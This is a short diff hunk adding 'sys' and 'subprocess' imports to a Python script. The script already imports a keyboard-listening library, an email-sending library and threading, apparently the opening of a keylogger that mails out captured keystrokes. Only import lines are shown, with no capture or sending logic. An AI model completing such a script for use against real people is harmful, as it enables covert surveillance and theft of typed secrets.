@@ -1,4 +1,6 @@
 #!/usr/bin/python
+import sys
+import subprocess
 import pynput.keyboard
 import smtplib
 import threading
